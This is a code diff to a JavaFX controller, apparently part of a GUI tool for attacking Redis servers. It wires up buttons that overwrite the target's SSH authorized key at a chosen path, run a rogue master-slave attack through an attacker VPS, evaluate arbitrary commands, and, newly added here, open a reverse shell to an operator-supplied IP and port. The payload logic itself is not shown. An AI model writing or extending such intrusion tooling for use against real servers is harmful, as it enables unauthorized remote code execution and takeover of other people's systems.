@@ -66,6 +66,19 @@ public class RedisController implements Initializable {
     @FXML
     private TextField redisVPSTimeOutTextField;
 
+    @FXML
+    private Button redisRevBtn;
+
+    @FXML
+    private TextField redisRevIPTextField;
+
+    @FXML
+    private TextField redisRevPortTextField;
+
+
+    @FXML
+    private TextField redisKeyPathInput;
+
     /**
      * 存储从 PostgreSqlDao 传递过来的 postgreSqlDao 使用
      */
@@ -98,12 +111,11 @@ public class RedisController implements Initializable {
             try {
                 this.redisDao = new RedisDao(this.dataObj.getString("ipaddress"), this.dataObj.getString("port"), this.dataObj.getString("password"), this.dataObj.getString("timeout"));
                 this.redisDao.getConnection();
+                this.redisDao.getInfo();
                 Platform.runLater(() -> {
-                    // 获取信息输出
-                    this.redisDao.getInfo();
-
                     redisLogTextFArea.appendText(Utils.log("连接成功！"));
                 });
+                // 获取信息输出
             } catch (Exception e) {
                 Platform.runLater(() -> {
                     redisLogTextFArea.appendText(Utils.log("连接失败！"));
@@ -133,7 +145,7 @@ public class RedisController implements Initializable {
     @FXML
     void redisReplaceSSHKey(ActionEvent event) {
         Runnable runner = () -> {
-            this.redisDao.sshkey(redisPublicKeyInput.getText());
+            this.redisDao.sshkey(redisPublicKeyInput.getText(),redisKeyPathInput.getText());
         };
         Thread workThrad = new Thread(runner);
         workThrad.start();
@@ -149,10 +161,17 @@ public class RedisController implements Initializable {
                 try {
                     this.redisDao.rogue(vpsAddress, vpsPort, timeout);
                 } catch (Exception e) {
-                    MessageUtil.showExceptionMessage(e, e.getMessage());
+                    Platform.runLater(() -> {
+                        MessageUtil.showExceptionMessage(e, e.getMessage());
+                    });
+                } finally {
+                    RedisDao.CONN.slaveofNoOne();
                 }
             } else {
-                MessageUtil.showErrorMessage( "请输入vps地址和端口");
+                Platform.runLater(() -> {
+                    MessageUtil.showErrorMessage("请输入vps地址和端口");
+                });
+
             }
         };
         Thread workThrad = new Thread(runner);
@@ -174,7 +193,9 @@ public class RedisController implements Initializable {
             String command = this.redisCommandTextField.getText();
             String code = redisEncodeCombox.getValue();
             if (code == null) {
-                MessageUtil.showErrorMessage( "请选择编码类型");
+                Platform.runLater(() -> {
+                    MessageUtil.showErrorMessage("请选择编码类型");
+                });
                 return;
             }
             String result = this.redisDao.eval(command, code);
@@ -184,7 +205,34 @@ public class RedisController implements Initializable {
         };
         Thread workThrad = new Thread(runner);
         workThrad.start();
+    }
 
+    /**
+     * 反弹shell
+     **/
+    @FXML
+    void redisRev(ActionEvent event) {
+        Runnable runner = () -> {
+            String revIp = this.redisRevIPTextField.getText();
+            String revPort = redisRevPortTextField.getText();
+            if (revIp == null || revIp.isEmpty() || revPort == null || revPort.isEmpty()) {
+                Platform.runLater(() -> {
+                    MessageUtil.showErrorMessage("请补全反弹的ip地址或端口");
+                });
+                return;
+            }
+
+            Platform.runLater(() -> {
+                redisLogTextFArea.appendText(Utils.log("正在尝试反弹到: " + revIp + ":" + revPort + " 请稍等,注意查看vps"));
+            });
+
+            String result = this.redisDao.revShell(revIp, revPort);
+            Platform.runLater(() -> {
+                redisOutputTextFArea.setText(result);
+            });
+        };
+        Thread workThread = new Thread(runner);
+        workThread.start();
     }
 
     /**
@@ -198,6 +246,7 @@ public class RedisController implements Initializable {
         );
         // 初始化下拉框
         redisEncodeCombox.setPromptText("UTF-8");
+        redisEncodeCombox.setValue("UTF-8");
         redisEncodeCombox.setItems(postgreSqlTypeCodeoptions);
     }
 }
